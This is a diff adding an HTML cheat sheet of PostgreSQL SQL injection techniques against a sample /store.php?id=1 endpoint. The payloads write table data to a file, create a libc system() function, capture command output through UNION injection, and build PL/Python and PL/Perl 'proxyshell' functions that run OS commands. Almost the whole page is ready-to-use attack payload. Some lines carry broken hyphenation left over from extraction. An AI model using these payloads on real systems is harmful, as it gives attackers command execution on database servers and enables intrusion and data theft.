@@ -1,0 +1,57 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Out-of-Band</title>
+</head><body><b>Copy data from table to file</b><br/>
+<tt><br/>
+/store.php?id=1; COPY file_store(data) TO ‘/var/lib/post- gresql/copy_output’--<br/>
+</tt><b><br/>
+<span style="font-size: 14pt">SHELL<br/>
+</span><br/>
+Injecting shell Posgres&lt;=8.1<br/>
+</b><tt><br/>
+CREATE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’, ‘system’ LANGUAGE ‘C’ STRICT<br/>
+</tt><b><br/>
+</b><b>Retrieve stdout from executed command</b><tt><br/>
+</tt><tt><br/>
+CREATE TABLE stdout(id serial, system_out text)<br/>
+SELECT system(‘uname -a &gt; /tmp/test’)<br/>
+COPY stdout(system_out) FROM ‘/tmp/test’<br/>
+</tt><tt>SELECT system_out FROM stdout</tt><br/>
+Example<br/>
+<tt>/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --<br/>
+/store.php?id=1; CREATE FUNCTION system(cstring) RE- TURNS int AS ‘/lib/libc.so.6’,’system’ LANGUAGE ‘C’ STRICT --<br/>
+/store.php?id=1; SELECT system(‘uname -a &gt; /tmp/test’) --<br/>
+/store.php?id=1; COPY stdout(system_out) FROM ‘/tmp/ test’ --<br/>
+/store.php?id=1 UNION ALL SELECT NULL,(SELECT sys- tem_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--<br/>
+<br/>
+</tt><b>plpython</b><br/>
+<br/>
+Check if PL/Python has been enabled on a database<br/>
+<tt>SELECT count(*) FROM pg_language WHERE lanname=’plpythonu’<br/>
+<br/>
+</tt>If not, try to enable<br/>
+<tt>CREATE LANGUAGE plpythonu</tt><br/>
+<br/>
+If either of the above succeeded, create a proxy shell function<br/>
+<tt>CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import os; return os.popen(args[0]).read() ‘LANGUAGE plpythonu<br/>
+<br/>
+</tt>Execute system commands<br/>
+<tt>SELECT proxyshell(os command);<br/>
+/store.php?id=1 UNION ALL SELECT NULL, proxyshell(‘whoa- mi’), NULL OFFSET 1;--<br/>
+</tt><br/>
+<b>plperl</b><br/>
+<br/>
+Check if PL/perl-untrusted has been enabled<br/>
+<tt>SELECT count(*) FROM pg_language WHERE lanname=’plperlu’<br/>
+<br/>
+</tt>If not, assuming that sysadm has already installed the plperl package, try<br/>
+<tt>CREATE LANGUAGE plperlu<br/>
+<br/>
+</tt>If either of the above succeeded, create a proxy shell function<br/>
+<tt>CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,&quot;$_[0] |&quot;);return join(&quot;&quot;,&lt;FD&gt;);' LANGUAGE plperlu<br/>
+<br/>
+</tt>Execute system commands<br/>
+<tt>SELECT proxyshell(os command);<br/>
+/store.php?id=1 UNION ALL SELECT NULL, proxyshell(‘whoami’), NULL OFFSET 1;--<br/>
+</tt></body></html>
